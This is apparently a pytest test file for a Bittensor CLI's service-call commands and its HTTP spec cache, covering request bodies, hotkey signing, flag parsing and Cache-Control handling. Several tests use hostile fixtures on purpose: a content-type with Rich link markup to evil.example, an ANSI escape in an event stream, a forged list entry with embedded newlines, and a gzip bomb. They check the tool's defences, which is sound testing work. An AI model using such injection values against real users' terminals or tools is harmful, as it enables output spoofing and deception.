        dry = invoke(
            "--json",
            "service",
            "call",
            "--netuid",
            "1",
            "transcribe",
            "--dry-run",
            "--file",
            f"audio={audio}",
        )
        preview = json.loads(dry.output)
        assert preview["body"].endswith(" bytes")
        assert preview["content_type"].startswith("multipart/form-data; boundary=")

    def test_a_body_that_is_not_json_is_sent_as_written_or_from_a_file(self, cli, tmp_path):
        cli.pages[SPEC_URL] = with_operation(
            "/notes",
            "put",
            {"operationId": "note", "requestBody": {"content": {"text/markdown": {}}}},
        )
        cli.pages["https://svc.example/api/v1/notes"] = Response(204, {}, b"")
        assert invoke("service", "call", "--netuid", "1", "note", "--body", "# hi").exit_code == 0
        assert cli.sent[-1][2]["Content-Type"] == "text/markdown" and cli.sent[-1][3] == b"# hi"
        note = tmp_path / "note.md"
        note.write_bytes(b"\xef\xbb\xbf# file")
        for flag in (["--body", f"@{note}"], ["--file", f"body={note}"]):
            assert invoke("service", "call", "--netuid", "1", "note", *flag).exit_code == 0
            assert cli.sent[-1][3] == b"\xef\xbb\xbf# file"

    def test_a_body_larger_than_memory_holds_goes_to_a_file(self, cli, monkeypatch):
        monkeypatch.setattr(services, "MAX_RESPONSE_BYTES", 4)
        body = b'{"data": "large"}'
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "application/json", "content-length": str(len(body))}, body
        )
        record = json.loads(
            invoke("--json", "service", "call", "--netuid", "1", "list-models").output
        )
        assert record["bytes"] == len(body) and Path(record["out"]).read_bytes() == body
        Path(record["out"]).unlink()

    def test_a_stream_of_events_is_printed_as_it_arrives(self, cli):
        events = b"data: one\n\ndata: two\x1b[2J\n\n"
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "text/event-stream"}, events
        )
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0, result.output
        assert "data: one\n\ndata: two[2J\n" in result.output
        record = json.loads(
            invoke("--json", "service", "call", "--netuid", "1", "list-models").output
        )
        assert record["text"] == events.decode()

    def test_a_content_type_prints_as_text_not_markup(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "video/[/x][link=https://evil.example]x[/link]"}, b"\x00\x01"
        )
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0, result.output
        text = " ".join(result.output.split())
        assert "content type video/[/x][link=https://evil.example]x[/link]" in text
        Path(re.search(r"out(\S+?)bytes", "".join(text.split()))[1]).unlink()

    def test_a_long_tag_description_titles_quickly(self):
        from bittensor.cli.commands import services as commands

        assert commands._tag_title("jobs", "[" * 1_000_000) == "jobs: " + "[" * 500

    def test_nested_fields_print_whole(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = {"a.b": 1, "a": {"b": 2, "c": None}}
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0
        assert yaml.safe_load(result.output) == {"a.b": 1, "a": {"b": 2, "c": None}}

    def test_an_optional_operation_is_signed_only_by_a_named_wallet(self, cli, monkeypatch):
        optional = spec()
        optional["paths"]["/tier"] = {
            "get": {"operationId": "tier", "security": [{"btauth": []}, {}]}
        }
        cli.pages[SPEC_URL] = optional
        cli.pages["https://svc.example/api/v1/tier"] = {}
        signed = invoke("service", "call", "--netuid", "1", "tier")
        assert signed.exit_code == 0 and "signed by hotkey" in signed.output
        assert http_auth.HEADER_SIGNATURE in cli.sent[-1][2]
        unsigned = invoke("service", "call", "--netuid", "1", "--unsigned", "tier")
        assert unsigned.exit_code == 0, unsigned.output
        assert http_auth.HEADER_SIGNATURE not in cli.sent[-1][2]
        missing = invoke("service", "call", "--netuid", "1", "-H", "nosuch", "tier")
        assert missing.exit_code == 1 and "cannot use hotkey 'nosuch'" in missing.output
        always = invoke("service", "call", "--netuid", "1", "--unsigned", "list-jobs")
        assert always.exit_code == 2 and "always signed" in always.output
        for flags, signs in (([], True), (["--unsigned"], False)):
            dry = invoke("--json", "service", "call", "--netuid", "1", *flags, "tier", "--dry-run")
            assert json.loads(dry.output)["signs"] is signs
        monkeypatch.delenv("BT_WALLET")
        default = invoke("service", "call", "--netuid", "1", "tier")
        assert default.exit_code == 0 and "sent unsigned; -w and -H sign it" in default.output
        assert http_auth.HEADER_SIGNATURE not in cli.sent[-1][2]

    def test_an_unsigned_call_the_service_will_not_take_says_to_sign_it(self, cli):
        optional = spec()
        optional["paths"]["/tier"] = {
            "get": {"operationId": "tier", "security": [{"btauth": []}, {}]}
        }
        cli.pages[SPEC_URL] = optional
        cli.pages["https://svc.example/api/v1/tier"] = Response(
            402, {"content-type": "application/json"}, b'{"error":"insufficient_balance"}'
        )
        result = invoke("service", "call", "--netuid", "1", "--unsigned", "tier")
        text = " ".join(result.output.split())
        assert result.exit_code == 1 and "sign it with your hotkey" in text
        assert "gamma spend" not in text

    def test_an_external_signer_never_falls_back_to_the_wallet(self, cli):
        result = invoke(
            "--json", "--signer", "ledger", "service", "call", "--netuid", "1", "list-jobs"
        )
        assert result.exit_code == 1 and json.loads(result.output)["code"] == "wallet"
        assert "--signer ledger" in json.loads(result.output)["error"]
        assert not [sent for sent in cli.sent if "/api/v1/" in sent[1]]

    def test_inputs_as_json_are_checked_as_flags_are(self, cli):
        call = ["--json", "service", "call", "--netuid", "1", "create-job", "--dry-run"]
        typed = invoke(*call, "--inputs", '{"model": "m", "limit": "two"}')
        assert typed.exit_code == 2 and "--limit takes INTEGER" in typed.output
        whole = invoke(*call, "--inputs", '{"body": {}}')
        assert whole.exit_code == 2 and "needs 'model'" in whole.output
        assert invoke(*call, "--inputs", '{"body": {"model": "m"}}').exit_code == 0

    def test_a_flag_is_never_the_value_of_the_one_before_it(self, cli):
        call = ["service", "call", "--netuid", "1", "create-job"]
        result = invoke(*call, "--model", "--dry_run", "--dry-run")
        assert result.exit_code == 2 and "--model needs a value" in result.output
        literal = invoke("--json", *call, "--model=--dry_run", "--dry-run")
        assert json.loads(literal.output)["body"] == {"model": "--dry_run"}

    def test_operation_help_shows_its_required_inputs_both_ways(self, cli):
        result = invoke("service", "call", "--netuid", "1", "create-job", "--help")
        text = " ".join(result.output.split())
        assert "create-job --model TEXT [INPUTS]" in text
        assert """create-job --inputs '{"body": {"model": …}}'""" in text

    def test_a_file_a_response_went_to_is_shown_even_when_quiet(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = Response(
            200, {"content-type": "image/png"}, b"\x89PNG"
        )
        result = invoke("--quiet", "service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 0 and "btcli-service-" in result.output
        Path(re.search(r"out(\S+?)bytes", "".join(result.output.split()))[1]).unlink()

    def test_a_publisher_that_cannot_be_resolved_is_an_input_error(self, cli):
        result = invoke("--json", "service", "show", "--netuid", "1", "--service-hotkey", "no/such")
        assert result.exit_code == 2 and json.loads(result.output)["code"] == "input"

    def test_list_keeps_each_service_on_one_line(self, cli, monkeypatch):
        from bittensor.cli import context as cli_context

        forged = "https://x.example/a\n       9  Trusted Service  12  " + BOB_HOT
        substrate = every_service({ALICE_HOT: forged})
        monkeypatch.setattr(
            cli_context, "Client", lambda network, **_: Client(network, substrate=substrate)
        )
        result = invoke("service", "list")
        assert result.exit_code == 0, result.output
        assert not any(line.lstrip().startswith("9 ") for line in result.output.splitlines())

    def test_an_input_takes_the_specs_spelling(self, cli):
        cli.pages["https://svc.example/api/v1/jobs"] = {}
        args = ["create-job", "--model", "m1", "--dry_run"]
        result = invoke("service", "call", "--netuid", "1", *args)
        assert result.exit_code == 0, result.output
        assert json.loads(cli.sent[-1][3]) == {"model": "m1", "dry_run": True}
        typo = invoke("service", "call", "--netuid", "1", "create-job", "--modle", "m")
        assert typo.exit_code == 2 and "did you mean --model" in typo.output

    def test_an_open_operation_error_has_no_wallet_hint(self, cli):
        cli.pages["https://svc.example/api/v1/models"] = Response(401, {}, b"")
        result = invoke("service", "call", "--netuid", "1", "list-models")
        assert result.exit_code == 1 and "HTTP 401" in result.output
        assert "help:" not in result.output


def kept(page: dict, cache_control: str = "max-age=300", **headers) -> Response:
    """A JSON page its Cache-Control lets a client keep."""
    fields = {"content-type": "application/json", "cache-control": cache_control, **headers}
    return Response(200, fields, json.dumps(page).encode())


def fetches(web: FakeWeb, url: str) -> int:
    return sum(1 for _, sent, _, _ in web.sent if sent == url)


class TestDocumentCache:
    def test_a_spec_is_kept_as_long_as_its_cache_control_allows(self, web, tmp_path, monkeypatch):
        web.pages[SPEC_URL] = kept(spec())
        client = Client("finney", substrate=chain({ALICE_HOT: DOC_URL}))
        for _ in range(3):
            asyncio.run(services.load(client, 1, cache=tmp_path))
        assert fetches(web, SPEC_URL) == 1
        assert fetches(web, DOC_URL) == 3  # it says nothing, so it is read each time
        later = time.time() + 301
        monkeypatch.setattr(services.time, "time", lambda: later)
        asyncio.run(services.load(client, 1, cache=tmp_path))
        assert fetches(web, SPEC_URL) == 2

    def test_a_long_max_age_is_kept_ten_minutes_at_most(self, web, tmp_path, monkeypatch):
        web.pages[SPEC_URL] = kept(spec(), "public, max-age=86400")
        client = Client("finney", substrate=chain({ALICE_HOT: DOC_URL}))
        asyncio.run(services.load(client, 1, cache=tmp_path))
        later = time.time() + services.CACHE_MAX_SECONDS + 1
        monkeypatch.setattr(services.time, "time", lambda: later)
        asyncio.run(services.load(client, 1, cache=tmp_path))
        assert fetches(web, SPEC_URL) == 2

    @pytest.mark.parametrize(
        "cache_control, age",
        [
            ("no-store, max-age=300", "0"),
            ("no-cache, max-age=300", "0"),
            ("max-age=300", "300"),
            ("max-age=abc", "0"),
            ('extension="x,max-age=300,y"', "0"),
            ('max-age="300', "0"),
            ("max-age=300, max-age = 1", "0"),
            ("", "0"),
        ],
    )
    def test_what_may_not_be_kept_is_read_again(self, web, tmp_path, cache_control, age):
        web.pages[SPEC_URL] = kept(spec(), cache_control, age=age)
        client = Client("finney", substrate=chain({ALICE_HOT: DOC_URL}))
        asyncio.run(services.load(client, 1, cache=tmp_path))
        asyncio.run(services.load(client, 1, cache=tmp_path))
        assert fetches(web, SPEC_URL) == 2

    def test_nothing_is_kept_without_a_cache_or_on_a_localnet(self, web, tmp_path):
        web.pages[SPEC_URL] = kept(spec())
        client = Client("finney", substrate=chain({ALICE_HOT: DOC_URL}))
        asyncio.run(services.load(client, 1))
        asyncio.run(services.load(client, 1))
        assert fetches(web, SPEC_URL) == 2
        local = Client("local", substrate=chain({ALICE_HOT: DOC_URL}))
        assert asyncio.run(services.load(local, 1, cache=tmp_path)).local
        assert not list(tmp_path.iterdir())

    def test_a_cache_file_for_another_url_or_too_far_ahead_is_not_used(self, web, tmp_path):
        web.pages[SPEC_URL] = kept(spec())
        client = Client("finney", substrate=chain({ALICE_HOT: DOC_URL}))
        asyncio.run(services.load(client, 1, cache=tmp_path))
        (path,) = tmp_path.iterdir()
        header, body = path.read_bytes().split(b"\n", 1)
        key, expires = header.split(b" ")
        assert body == web.pages[SPEC_URL].content
        for invalid in (
            b"0" * 64 + b" " + expires + b"\n" + body,
            key + f" {time.time() + 10**6}\n".encode() + body,
            header + b"\n" + b"not JSON",
            b"no header",
        ):
            path.write_bytes(invalid)
            asyncio.run(services.load(client, 1, cache=tmp_path))
        assert fetches(web, SPEC_URL) == 5

    def test_relative_urls_follow_each_metadata_redirect(self, web, tmp_path):
        doc = document(services=[{"type": "openapi", "endpoint": "spec.json"}])
        doc["payments"][0]["balance"] = "balance"
        headers = {"cache-control": "max-age=300", "content-type": "application/json"}
        web.pages[DOC_URL] = Response(
            200, headers, json.dumps(doc).encode(), "https://docs.example/v1/doc"
        )
        web.pages["https://docs.example/v1/spec.json"] = Response(
            200,
            headers,
            json.dumps(spec(servers=[{"url": "./api"}])).encode(),
            "https://api.example/v2/spec.json",
        )
        service = asyncio.run(services.load_url(DOC_URL, cache=tmp_path))
        assert service.api_url == "https://api.example/v2/api"
        assert service.balance_url == "https://docs.example/v1/balance"
        assert not list(tmp_path.iterdir())

    def test_a_truncated_gzip_trailer_is_refused(self, web):
        fields = {"content-type": "application/json", "content-encoding": "gzip"}
        web.pages[SPEC_URL] = Response(200, fields, gzip.compress(json.dumps(spec()).encode())[:-1])
        with pytest.raises(ServiceError, match="not valid gzip"):
            load()

    def test_the_cache_drops_its_oldest_entries_past_its_size(self, tmp_path, monkeypatch):
        response = kept(document())
        monkeypatch.setattr(services, "CACHE_MAX_BYTES", 10 * (len(response.content) + 100))
        for n in range(100):
            services._keep(tmp_path, f"https://example.org/{n}", response)
        sizes = [path.stat().st_size for path in tmp_path.iterdir()]
        assert sum(sizes) <= services.CACHE_MAX_BYTES and len(sizes) < 100
        assert services._cached(tmp_path, "https://example.org/99") == response.content
        assert services._cached(tmp_path, "https://example.org/0") is None

    def test_repeated_cache_headers_are_observed(self):
        from email.message import Message

        headers = Message()
        headers["Cache-Control"] = "no-store"
        headers["Cache-Control"] = "max-age=300"
        assert services._max_age(services._headers(headers)) == 0

    def test_a_stale_date_consumes_the_freshness_lifetime(self):
        fields = {"cache-control": "max-age=300", "date": "Tue, 15 Nov 1994 08:12:31 GMT"}
        assert services._max_age(fields) == 0

    def test_oversized_cache_numbers_are_ignored(self):
        assert services._max_age({"cache-control": "max-age=" + "9" * 6000}) == 0
        assert services._max_age({"cache-control": "max-age=300", "age": "9" * 6000}) == 0

    def test_a_gzipped_document_is_read(self, web):
        body = gzip.compress(json.dumps(spec()).encode())
        fields = {"content-type": "application/json", "content-encoding": "gzip"}
        web.pages[SPEC_URL] = Response(200, fields, body)
        assert "listModels" in load().operations
        assert web.sent[-1][2]["Accept-Encoding"] == "gzip"

    def test_gzip_that_inflates_past_the_limit_is_refused(self, web, monkeypatch):
        monkeypatch.setattr(services, "MAX_SPEC_BYTES", 1 << 16)
        fields = {"content-type": "application/json", "content-encoding": "gzip"}
        web.pages[SPEC_URL] = Response(200, fields, gzip.compress(b" " * (1 << 20)))
        with pytest.raises(ServiceError) as error:
            load()
        assert error.value.code == "too_large"
        web.pages[SPEC_URL] = Response(200, fields, b"not gzip")
        with pytest.raises(ServiceError, match="not valid gzip"):
            load()

    def test_a_run_of_btcli_calls_reads_the_spec_once(self, cli):
        cli.pages[SPEC_URL] = kept(spec())
        cli.pages["https://svc.example/api/v1/models"] = {"data": ["m"]}
        for _ in range(3):
            result = invoke("service", "call", "--netuid", "1", "list-models")
            assert result.exit_code == 0, result.output
        assert fetches(cli, SPEC_URL) == 1

    def test_show_by_url_always_reads_the_document(self, cli):
        cli.pages[DOC_URL] = kept(document())
        cli.pages[SPEC_URL] = kept(spec())
        for _ in range(2):
            assert invoke("service", "show", "--url", DOC_URL).exit_code == 0
        assert (fetches(cli, DOC_URL), fetches(cli, SPEC_URL)) == (2, 2)
